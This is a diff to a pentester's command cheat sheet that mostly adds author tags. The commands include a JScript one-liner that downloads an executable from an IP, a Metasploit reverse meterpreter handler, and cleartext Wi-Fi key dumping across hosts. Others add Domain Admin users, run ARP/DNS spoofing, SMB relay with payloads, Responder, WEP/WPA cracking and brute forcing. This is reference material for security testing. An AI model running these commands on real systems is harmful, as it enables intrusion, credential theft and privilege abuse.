 Windows
 enumeration
@@ -1159,6 +1286,7 @@ http://pentestmonkey.net/tools/windows-privesc-check
 EOR
 sc query
 Unquoted Service Paths
+Innes
 EOC
 Windows
 enumeration
@@ -1169,6 +1297,7 @@ http://pentestmonkey.net/tools/windows-privesc-check
 EOR
 sc qc "[SERVICE]"
 Unquoted Service Paths
+Innes
 EOC
 Windows
 enumeration
@@ -1179,6 +1308,7 @@ http://pentestmonkey.net/tools/windows-privesc-check
 EOR
 sc config "[SERVICE]" start= auto
 Unquoted Service Paths, start service
+Innes
 EOC
 Windows
 enumeration
@@ -1189,6 +1319,7 @@ http://pentestmonkey.net/tools/windows-privesc-check
 EOR
 sc config "[SERVICE]" start= disabled
 Unquoted Service Paths
+Innes
 EOC
 Windows
 enumeration
@@ -1198,6 +1329,7 @@ http://pentestmonkey.net/tools/windows-privesc-check
 EOR
 Sub Test();Shell ("powershell");End Sub
 VBA launching command
+@yght
 EOC
 Windows
 EOT
@@ -1206,6 +1338,7 @@ https://support.smartbear.com/testcomplete/docs/testing-with/advanced/using-exte
 EOR
 echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("out.exe");>wget.js
 Javascript wget windows oneline : cscript /nologo wget.js http://[IP]
+Innes
 EOC
 Windows
 Files
@@ -1215,6 +1348,7 @@ http://superuser.com/questions/25538/how-to-download-files-from-command-line-in-
 EOR
 netsh wlan show profile
 Windows Wireless
+Innes
 EOC
 Windows
 networking
@@ -1227,6 +1361,7 @@ http://Microsoft.com
 EOR
 netsh wlan show profile name="[SSID]" key=clear
 Windows Wireless
+@yght
 EOC
 Windows
 networking
@@ -1238,6 +1373,7 @@ https://www.labnol.org/software/find-wi-fi-network-password/28949/
 EOR
 for host in $(cat localsubnet.txt); do echo "Trying $host"; winexe --user [Domain]/[user]%[pass] //$host "netsh wlan export profile name=[PROFILE] key=clear"; done
 loop dump wifi keys
+@yght
 EOC
 loop
 bash
@@ -1251,6 +1387,7 @@ https://www.labnol.org/software/find-wi-fi-network-password/28949/
 EOR
 run autoroute -s [CIDR SUBNET]
 proxy Metasploit pivot
+@yght
 EOC
 metasploit
 pivoting
@@ -1259,6 +1396,7 @@ http://Microsoft.com
 EOR
 run autoroute -p
 proxy metasploit pivot
+@yght
 EOC
 metasploit
 pivoting
@@ -1267,6 +1405,7 @@ https://www.offensive-security.com/metasploit-unleashed/pivoting/
 EOR
 background it then run...
 proxy Metasploit pivot
+@yght
 EOC
 metasploit
 pivoting
@@ -1275,6 +1414,7 @@ https://www.offensive-security.com/metasploit-unleashed/pivoting/
 EOR
 use auxiliary/server/socks4a
 proxy Metasploit pivot
+@yght
 EOC
 metasploit
 pivoting
@@ -1283,6 +1423,7 @@ https://www.offensive-security.com/metasploit-unleashed/pivoting/
 EOR
 proxychains cmd
 proxy pivot
+@yght
 EOC
 metasploit
 pivoting
@@ -1292,6 +1433,7 @@ https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
 EOR
 type [FILE]
 Cat for windows
+Innes
 EOC
 Windows
 Files
@@ -1300,6 +1442,7 @@ https://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/
 EOR
 net group "Domain Admins" /domain
 Domain Admins windows
+@yght
 EOC
 Windows
 enumeration
@@ -1310,6 +1453,7 @@ https://technet.microsoft.com/en-us/library/bb490949.aspx
 EOR
 /data/hacking/theHarvester/theHarvester.py -h -d [domain] -l 1000 -b all | tee harvester-search-[DETAIL].txt
 harvester
+@yght
 EOC
 Linux
 scanning
@@ -1321,6 +1465,7 @@ https://yg.ht
 EOR
 /data/hacking/theHarvester/theHarvester.py -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt
 harvester linkedin
+@yght
 EOC
 Linux
 scanning
@@ -1332,6 +1477,7 @@ https://yg.ht
 EOR
 wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx
 KeePass2 Cracking
+@yght
 EOC
 Linux
 Windows
@@ -1343,6 +1489,7 @@ https://yg.ht
 EOR
 find / -iname '[SEARCH TERM]' 2>/dev/null
 Find files
+@yght
 EOC
 Linux
 Files
@@ -1353,6 +1500,7 @@ https://www.cyberciti.biz/tips/linux-findinglocating-files-with-find-command-par
 EOR
 /opt/nessus/bin/nessuscmd -U -O -p[port] -V -i [plugin ID] [target IP]
 Single Nessus Module
+@yght
 EOC
 scanning
 nessus
@@ -1362,6 +1510,7 @@ https://yg.ht
 EOR
 openssl s_client -connect [domain]:443
 'Telnet' s_client to SSL
+@yght
 EOC
 Linux
 certificates
@@ -1371,6 +1520,7 @@ https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-opens
 EOR
 ike-scan -A -v -id=test -f [input file] -P[PSK output file]
 IKE Agressive
+@yght
 EOC
 Linux
 scanning
@@ -1380,6 +1530,7 @@ http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-
 EOR
 psk-crack -d [word list e.g. rockyou.txt] [input key file]
 IKE Agressive
+@yght
 EOC
 Linux
 cracking
@@ -1388,6 +1539,7 @@ http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-
 EOR
 ipconfig /displaydns
 Windows ARP Cache
+@yght
 EOC
 Windows
 networking
@@ -1397,6 +1549,7 @@ https://technet.microsoft.com/en-gb/library/bb490921.aspx
 EOR
 use multi/handler
 MSFConsole hints
+@yght
 EOC
 metasploit
 EOT
@@ -1404,6 +1557,7 @@ https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
 EOR
 set PAYLOAD windows/meterpreter/reverse_https
 MSFConsole hints
+@yght
 EOC
 metasploit
 EOT
@@ -1411,6 +1565,7 @@ https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
 EOR
 set LHOST [IP]
 MSFConsole hints
+@yght
 EOC
 metasploit
 EOT
@@ -1418,6 +1573,7 @@ https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
 EOR
 set LPORT 443
 MSFConsole hints
+@yght
 EOC
 metasploit
 EOT
@@ -1425,6 +1581,7 @@ https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
 EOR
 set ExitOnSession false
 MSFConsole hints
+@yght
 EOC
 metasploit
 EOT
@@ -1432,6 +1589,7 @@ https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
 EOR
 exploit -j
 MSFConsole hints
+@yght
 EOC
 metasploit
 EOT
@@ -1439,6 +1597,7 @@ https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
 EOR
 net user [user] [pass] /add /domain
 Add a domain user from the CLI
+@yght
 EOC
 Windows
 user information
@@ -1449,6 +1608,7 @@ https://technet.microsoft.com/en-us/library/cc771865(v=ws.11).aspx
 EOR
 net group "Domain Admins" [user] /add /domain
 Add [User] to the domain admins group
+@yght
 EOC
 Windows
 user information
@@ -1459,6 +1619,7 @@ https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
 EOR
 net group "Enterprise Admins" [user] /add /domain
 Add user to enterprise admins
+@yght
 EOC
 Windows
 user information
@@ -1469,6 +1630,7 @@ https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
 EOR
 net localgroup "Remote Desktop Users" [user] /add /domain
 Add user to the RDP group
+@yght
 EOC
 windows
 user information
@@ -1477,9 +1639,10 @@ EOT
 https://technet.microsoft.com/en-us/library/bb490949.aspx
 https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
 EOR
-net localgroup "Administrators" [user] /add
+net localgroup "Administrators" [user] /add /domain
 Add a user to the local admin group, not as useful any more
-EOC
+Innes
+@yght
 Windows
 user information
 privilege escalation
@@ -1489,6 +1652,7 @@ https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
 EOR
 /data/hacking/sqlmap/sqlmap.py --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o
 SQLmap generic command
+@yght
 EOC
 sql injection
 EOT
@@ -1496,6 +1660,7 @@ https://github.com/sqlmapproject/sqlmap/wiki/Usage
 EOR
 etterfilter *.filter -o smb.ef
 ARP Spoofing filter
+Innes
 EOC
 Linux
 networking
@@ -1506,6 +1671,7 @@ http://www.thegeekstuff.com/2012/05/ettercap-tutorial
 EOR
 ettercap -i em1 -L etter.log -T -M arp:remote /192.168.104.254/// ////
 ARP Spoofing gateway
+@yght
 EOC
 Linux
 networking
@@ -1517,6 +1683,7 @@ http://www.thegeekstuff.com/2012/05/ettercap-tutorial
 EOR
 ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
 ARP Spoofing everything
+@yght
 EOC
 Linux
 networking
@@ -1529,6 +1696,7 @@ http://www.thegeekstuff.com/2012/05/ettercap-tutorial
 EOR
 ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
 ARP Spoofing DNS
+@yght
 EOC
 Linux
 networking
@@ -1541,6 +1709,7 @@ http://www.thegeekstuff.com/2012/05/ettercap-tutorial
 EOR
 ipcalc -b [CIDR Subnet]
 Subnet calculator
+Innes
 EOC
 networking
 subnets
@@ -1549,6 +1718,7 @@ https://www.cyberciti.biz/tips/perform-simple-manipulation-of-ip-addresse.html
 EOR
 tcpdump -n -i [interface]
 TCPDump (no DNS resolution)
+Innes
 EOC
 networking
 packet capture
@@ -1558,6 +1728,7 @@ https://www.cyberciti.biz/faq/tcpdump-capture-record-protocols-port/
 EOR
 arping -I em1 [TARGET IP]
 ARPing
+Innes
 EOC
 Linux
 networking
@@ -1567,6 +1738,7 @@ https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
 EOR
 for a in {0..254}; do arping -D -c 1 -I eth0 [NETWORK].$a; done | tee arping-[NET].txt
 ARPing sweep network
+@yght
 EOC
 Linux
 loop
@@ -1578,6 +1750,7 @@ https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
 EOR
 ifconfig eth0 192.168.0.x/24
 Temporary IP
+Innes
 EOC
 Linux
 bash
@@ -1588,6 +1761,7 @@ https://www.cyberciti.biz/faq/linux-change-ip-address/
 EOR
 airmon-ng start wlan1
 Wireless survey WIFI
+Innes
 EOC
 Linux
 wireless
@@ -1597,6 +1771,7 @@ http://www.aircrack-ng.org/doku.php?id=airmon-ng
 EOR
 ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifup wlan0
 Wireless survey WIFI, useful if airmon start is broke
+Innes
 EOC
 Linux
 networking
@@ -1607,6 +1782,7 @@ http://www.aircrack-ng.org/doku.php?id=airmon-ng
 EOR
 airodump-ng -c [Channel #] --bssid [MAC Address] --showack -w [SSID] wlan1mon
 WIFI WPA handshake capture
+@yght
 EOC
 Linux
 networking
@@ -1618,6 +1794,7 @@ https://www.aircrack-ng.org/doku.php?id=cracking_wpa
 EOR
 wpaclean [OUTPUT] [INPUT]
 WIFI WPA handshake prep
+@yght
 EOC
 Linux
 wireless
@@ -1628,6 +1805,7 @@ https://www.aircrack-ng.org/doku.php?id=cracking_wpa
 EOR
 aircrack-ng [INPUT.cap] -J [OUTPUT]
 WIFI WPA handshake prep
+@yght
 EOC
 Linux
 wireless
@@ -1638,6 +1816,7 @@ https://www.aircrack-ng.org/doku.php?id=cracking_wpa
 EOR
 airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0
 wep cracking
+@yght
 EOC
 Linux
 wireless
@@ -1648,6 +1827,7 @@ https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
 EOR
 aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0
 wep cracking
+@yght
 EOC
 Linux
 wireless
@@ -1658,6 +1838,7 @@ https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
 EOR
 aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0
 wep cracking
+@yght
 EOC
 Linux
 networking
@@ -1669,6 +1850,7 @@ https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
 EOR
 aireplay-ng -3 -b [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0
 wep cracking
+@yght
 EOC
 Linux
 wireless
@@ -1679,6 +1861,7 @@ https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
 EOR
 aircrack-ng -b [VICTIM MAC] [OUTPUT]*cap
 wep cracking
+@yght
 EOC
 Linux
 wireless
@@ -1689,6 +1872,7 @@ https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
 EOR
 iptables -I OUTPUT -d [DST IP] -j DROP
 Block outbound rule
+Innes
 EOC
 Linux
 networking
@@ -1697,6 +1881,7 @@ http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Fir
 EOR
 iptables -I INPUT -p tcp --destination-port [PORT] -j ACCEPT
 Accept inbound port rule
+Innes
 EOC
 Linux
 networking
@@ -1705,6 +1890,7 @@ http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Fir
 EOR
 medusa -M ssh -U userlist -P passwordlist -h [host]
 medusa brute force
+Innes
 EOC
 Linux
 brute
@@ -1713,6 +1899,7 @@ http://foofus.net/goons/jmk/medusa/medusa.html
 EOR
 ./mp64.bin -o custom.dic -1 tT -2 eE3 -3 ?s ?1qq?2qqq?2?2qq?2?3?3
 Word list generator
+@yght
 EOC
 Linux
 Windows
@@ -1723,6 +1910,7 @@ https://hashcat.net/wiki/doku.php?id=maskprocessor
 EOR
 /data/hacking/hashcat-0.49/hashcat-cli64.bin -m 99999 wordseed.dic -r /data/hacking/hashcat-0.49/rules/leetspeak.rule --stdout | sort -u > custom.dic
 Word list generator
+@yght
 EOC
 Linux
 Windows
@@ -1733,6 +1921,7 @@ https://hashcat.net/wiki/doku.php?id=maskprocessor
 EOR
 ncrack -v -d1 -T5 -P /usr/share/wordlists/rockyou.txt [service eg vnc]://[target IP]:[port eg 5900] -oA [output file]-ncrack.txt
 brute force ncrack vnc
+Innes
 EOC
 Linux
 brute
@@ -1741,6 +1930,7 @@ https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
 EOR
 dig -t AXFR [FQDN] @[SERVER IP]
 DNS zone transfer
+Innes
 EOC
 linux
 networking
@@ -1750,6 +1940,7 @@ http://www.thegeekstuff.com/2012/02/dig-command-examples
 EOR
 nbtscan -v -s : 192.168.0.0/24 >> nbtscan-[SUBNET].txt
 NBTScan
+@yght
 EOC
 Linux
 smb
@@ -1760,6 +1951,7 @@ http://unixwiz.net/tools/nbtscan.html
 EOR
 for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done
 NBTScan en masse
+@yght
 EOC
 Linux
 loop
@@ -1771,6 +1963,7 @@ http://unixwiz.net/tools/nbtscan.html
 EOR
 for a in {0..255}; do host -t ns $a.168.192.in-addr.arpa | grep -v "name server"; done >> networks.txt
 network discovery RDNS
+@yght
 EOC
 loop
 networking
@@ -1782,6 +1975,7 @@ https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
 EOR
 cat networks-dirty.txt | grep "^[0-9]" | awk {'print $1'} | awk -F "." {'print $3"."$2"."$1".0/24"'} | sort -u > nets.txt
 network discovery RDNS
+@yght
 EOC
 loop
 networking
@@ -1793,6 +1987,7 @@ https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
 EOR
 nmap -sS -n -v -T5 -iL networks-sorted.txt -oA nmapScan-ARP
 network discovery RDNS
+@yght
 EOC
 Linux
 networking
@@ -1804,6 +1999,7 @@ https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
 EOR
 cat nmapScan-ARP.gnmap | grep "Status: Up" | awk {'print $2'} | awk -F "." {'print $1"."$2"."$3".0/24"'} | sort -u > networks-withlivehosts.txt
 network discovery RDNS
+@yght
 EOC
 Linux
 networking
@@ -1814,6 +2010,7 @@ http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 python -m SimpleHTTPServer [PORT]
 instant web server
+Innes
 EOC
 interesting
 python
@@ -1824,6 +2021,7 @@ https://docs.python.org/2/library/simplehttpserver.html
 EOR
 smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe]
 smbrelay targeted
+Innes
 EOC
 Linux
 Windows
@@ -1836,6 +2034,7 @@ https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
 EOR
 smbrelayx.py -e [PAYLOAD exe]
 smbrelay reflection : note read into http -> smb refelction
+Innes
 EOC
 Linux
 Windows
@@ -1848,6 +2047,7 @@ https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
 EOR
 /data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP]
 responder NBNS LLMNR
+@yght
 EOC
 Linux
 smb
@@ -1858,8 +2058,9 @@ EOT
 https://github.com/SpiderLabs/Responder
 https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
 EOR
-smbclient -L [TARGET] -U [USER]
-List smb shares on a target host
+smbclient -L [TARGET] -U [DOM]/[USER]%'[PASS]'
+List smb shares on a target host domain and pass are optional, % seperates user from pass
+Innes
 EOC
 Linux
 smb
@@ -1869,6 +2070,7 @@ https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
 EOR
 strings [FILENAME] --bytes=2 |grep "^sa$" -A 4
 text in binaries
+Innes
 EOC
 Linux
 Files
@@ -1878,6 +2080,7 @@ http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 telnet [IP] 25
 Telnet Mail
+Innes
 EOC
 Linux
 networking
@@ -1887,6 +2090,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 HELO [FQDN of your RDNS]
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1894,6 +2098,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 MAIL FROM: [SENDER ADDRESS]
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1901,6 +2106,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 RCPT TO: [RECIPIENT ADDRESS]
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1908,6 +2114,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 DATA
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1915,6 +2122,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 Subject: [SUBJECT]
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1922,6 +2130,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 Date: [DATE]
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1929,6 +2138,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 From: [REAL NAME] <[EMAIL]>
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1936,6 +2146,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 To: [REAL NAME] <[EMAIL]>
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1943,6 +2154,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 [MESSAGE]
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1950,6 +2162,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 . (don't forget the full stop)
 Telnet Mail
+Innes
 EOC
 networking
 EOT
@@ -1957,6 +2170,7 @@ http://www.yuki-onna.co.uk/email/smtp.html
 EOR
 halberd -v -p 10 [URL]
 load balance detection
+Innes
 EOC
 Linux
 networking
@@ -1965,8 +2179,9 @@ scanning
 EOT
 https://github.com/jmbr/halberd
 EOR
-/data/hacking/enum4linux-0.8.9/enum4linux.pl -a -u [USER] -p [PASS] [TARGET] | tee [CLIENTNAME].domainenum
+enum4linux.pl -a -u [USER] -p [PASS] [TARGET] | tee [CLIENTNAME].domainenum
 Get a listing of all users and groups for targeting your post exploitation
+@yght
 EOC
 Linux
 smb
@@ -1977,6 +2192,7 @@ https://labs.portcullis.co.uk/tools/enum4linux/
 EOR
 cat [CLIENTNAME].domainenum | grep "^user" | cut -d ":" -f 2 | cut -d "]" -f 1 | cut -d "[" -f 2 > userlist.txt
 Get a list of all the users in the domain from a full dump
+@yght
 EOC
 Linux
 smb
@@ -1985,8 +2201,9 @@ user information
 EOT
 http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
-/data/hacking/vlan-hopping/frogger.sh
+frogger.sh
 Check for vlans that you can hop to : may need to change the grep for interfaces
+@yght
 EOC
 bash
 networking
@@ -1996,6 +2213,7 @@ https://github.com/nccgroup/vlan-hopping---frogger
 EOR
 vconfig add em1 [VLANID]
 manual vlans
+@yght
 EOC
 Linux
 bash
@@ -2007,6 +2225,7 @@ https://www.cyberciti.biz/tips/howto-configure-linux-virtual-local-area-network-
 EOR
 dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1
 dhcp client
+@yght
 EOC
 Linux
 bash
@@ -2018,6 +2237,7 @@ https://www.cyberciti.biz/faq/tag/dhclient-command/
 EOR
 cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {'print $11'}`
 dhcp lease rpm
+@yght
 EOC
 Linux
 bash
@@ -2028,6 +2248,7 @@ https://www.cyberciti.biz/faq/tag/dhclient-command/
 EOR
 cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {'print $11'}`
 dhcp lease deb
+@yght
 EOC
 Linux
 bash
@@ -2038,6 +2259,7 @@ https://www.cyberciti.biz/faq/tag/dhclient-command/
 EOR
 ls -lt /var/lib/NetworkManager/
 dhcp lease
+@yght
 EOC
 Linux
 bash
@@ -2047,6 +2269,7 @@ https://www.cyberciti.biz/faq/tag/dhclient-command/
 EOR
 route add -net [CIDR] gw [IP] [INTERFACE]
 route table add
+@yght
 EOC
 Linux
 bash
@@ -2059,6 +2282,7 @@ http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Net
 EOR
 route del -net 0.0.0.0 gw [GW] eth1
 route table del
+@yght
 EOC
 Linux
 bash
@@ -2071,6 +2295,7 @@ http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Net
 EOR
 7z a -p -mem=AES report.zip [INPUT FILE]
 Encrypted zip
+@yght
 EOC
 Linux
 Files
@@ -2081,6 +2306,7 @@ https://www.cyberciti.biz/tips/how-can-i-zipping-and-unzipping-files-under-linux
 EOR
 ./hashcat-cli64.bin --session=[SESSIONNAME] -m[hash ID] [input file] [dict file] --rules rules/[rule file e.g. best64.rule d3ad0ne.rule etc]
 hashcat cpu
+@yght
 EOC
 Linux
 Windows
@@ -2090,6 +2316,7 @@ https://hashcat.net/wiki/
 EOR
 hc --gpu-temp-abort=100 --remove -m5500 netntlmv1.hash -a3 -1 '?u?l?d' '?1?1?1?1?1?1?1?1' -o hash.crack
 hashcat assuming that hc is an alias (kraken | pablo)
+@yght
 EOC
 Linux
 hashes
@@ -2099,6 +2326,7 @@ https://hashcat.net/wiki/
 EOR
 500  MD5 Crypt $1 | 7400 SHA256 Crypt $5 | 1800 Sha512 Crypt $6
 hashcat types
+Innes
 EOC
 hashes
 cracking
@@ -2108,6 +2336,7 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 EOR
 1000 NTLM | 3000 LM
 hashcat types
+Innes
 EOC
 hashes
 cracking
@@ -2115,8 +2344,9 @@ reference
 EOT
 https://hashcat.net/wiki/doku.php?id=example_hashes
 EOR
-1100 MScashv1 | 2100 MScashv2
+1100 MScashv1 | 2100 MScashv2 (802.1X)
 hashcat types
+Innes
 EOC
 hashes
 cracking
@@ -2126,6 +2356,7 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 EOR
 2500 WPA/WPA2
 hashcat types
+Innes
 EOC
 hashes
 cracking
@@ -2133,8 +2364,9 @@ reference
 EOT
 https://hashcat.net/wiki/doku.php?id=example_hashes
 EOR
-5600 NetNTLMv2 | 5500 NetNTLMv1 5400 = IKE-PSK SHA1 | 5300 = IKE-PSK MD5 |
+5600 NetNTLMv2 | 5500 NetNTLMv1 | 5400 = IKE-PSK SHA1 | 5300 = IKE-PSK MD5 |
 hashcat types
+Innes
 EOC
 hashes
 cracking
@@ -2144,6 +2376,7 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 EOR
 cvs checkout [package name]
 cvs check out repo
+Innes
 EOC
 Linux
 bash
@@ -2152,6 +2385,7 @@ http://tulrich.com/geekstuff/cvs.html
 EOR
 cvs update -d .
 cvs update local repo
+Innes
 EOC
 Linux
 bash
@@ -2160,6 +2394,7 @@ http://tulrich.com/geekstuff/cvs.html
 EOR
 cvs commit -m "[Comment]" [File inc "package"]
 cvs comit change with message
+Innes
 EOC
 web address
 EOT
@@ -2167,6 +2402,7 @@ http://tulrich.com/geekstuff/cvs.html
 EOR
 cvs add [File inc "package"]
 cvs add a new file
+Innes
 EOC
 Linux
 bash
@@ -2175,6 +2411,7 @@ http://tulrich.com/geekstuff/cvs.html
 EOR
 cvs release [package or file in package]
 cvs delete file
+Innes
 EOC
 Linux
 bash
@@ -2183,6 +2420,7 @@ http://tulrich.com/geekstuff/cvs.html
 EOR
 for a in $(cat ../nmap/IPs-HTTPS.txt); do sslscan $a; done | tee sslscan-[NET].txt
 sslscan, you will want to git clone and make static if your in kali
+@yght
 EOC
 loop
 scanning
@@ -2193,6 +2431,7 @@ https://github.com/rbsec/sslscan
 EOR
 openssl s_client -connect victim.com:443 (this shows the chain)
 sslscan cert checks
+Innes
 EOC
 Linux
 certificates
@@ -2201,6 +2440,7 @@ http://security.stackexchange.com/questions/70733/how-do-i-use-openssl-s-client-
 EOR
 openssl s_client -showcerts -connect victim.com:443 2>/dev/null | awk '$0=="-----BEGIN CERTIFICATE-----" {p=1}; p; $0=="-----END CERTIFICATE-----" {p=0}' (this pulls just the certificates for each in the chain)
 sslscan cert checks
+@yght
 EOC
 Linux
 bash
@@ -2212,17 +2452,19 @@ https://www.sslshopper.com/article-most-common-openssl-commands.html
 EOR
 openssl x509 -noout -text | grep -i "signature algorithm\|before\|after\|issuer\|subject:" (split the above commands output and stick in here, then manually analyse)
 sslscan cert checks
+@yght
 EOC
 Linux
 bash
 certificates
 EOT
-https://yg.h
+https://yg.ht
 https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
 https://www.sslshopper.com/article-most-common-openssl-commands.html
 EOR
 genpasswd [CHAR LENGTH]
 Password Generator
+Innes
 EOC
 Linux
 passwords
@@ -2231,6 +2473,7 @@ https://www.cyberciti.biz/faq/linux-random-password-generator/
 EOR
 iodine -P [pass] [server]
 dns tunneling
+@yght
 EOC
 networking
 pivoting
@@ -2240,6 +2483,7 @@ http://calebmadrigal.com/dns-tunneling-with-iodine/
 EOR
 nmap -sS -Pn --open -T5 -p- [portspoofip] | tee nmap-tcp-outbound.txt
 nmap outbound tcp
+@yght
 EOC
 Linux
 networking
@@ -2251,6 +2495,7 @@ https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
 EOR
 nmap -Pn --open -T5 -sU -p- [portspoofip]| tee nmap-udp-outbound.txt
 nmap outbound upd
+@yght
 EOC
 Linux
 networking
@@ -2262,6 +2507,7 @@ https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
 EOR
 nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning
 nmap smb signing
+@yght
 EOC
 Linux
 smb
@@ -2275,6 +2521,7 @@ https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
 EOR
 nmap -sS -n -v -T4 -P0 -p- -oA nmap-tcp-scan -iL subnets.txt
 nmap devicemap all tcp
+@yght
 EOC
 Linux
 networking
@@ -2286,6 +2533,7 @@ https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
 EOR
 nmap -sU -n -v -T4 -P0 --top-ports 1000 -oA nmap-udp-scan -iL subnets.txt
 nmap devicemap top 1000 udp
+@yght
 EOC
 Linux
 networking
@@ -2297,6 +2545,7 @@ https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
 EOR
 grep "Discovered open port" nmap-udp-scan.txt | sed "s/\// /g" | sed "s/ /\t/g" | awk -F "\t" {'print $7"\t"$5"\t"$4"\topen"'} > devicemap-udp.tsv
 nmap devicemap
+@yght
 EOC
 Linux
 bash
@@ -2307,6 +2556,7 @@ http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 for file in $( ls -lash | grep ".gnmap" | awk {'print $10'} ); do cat $file | grep "Ports" | grep "open" | awk {'print $2'} | sort -u > IPs-`echo $file | cut -d "-" -f 2 | cut -d "." -f 1;`.txt; done
 nmap service discovery
+@yght
 EOC
 loop
 bash
@@ -2316,6 +2566,7 @@ http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 cat nmapScan-[SERVICE].gnmap | grep "Ports" | grep "open" | grep -v "open|filtered" | awk {'print $2'} | sort -u > IPs-[SERVICE].txt
 nmap service discovery
+Innes
 EOC
 Linux
 bash
@@ -2325,6 +2576,7 @@ http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 cat users | awk '{print substr ($0, 1, 1),$2}' | tr [A-Z] [a-z] | sort | uniq
 Convert a user list in format "first last" to flast
+Innes
 EOC
 Linux
 bash
@@ -2337,6 +2589,7 @@ https://necurity.co.uk
 EOR
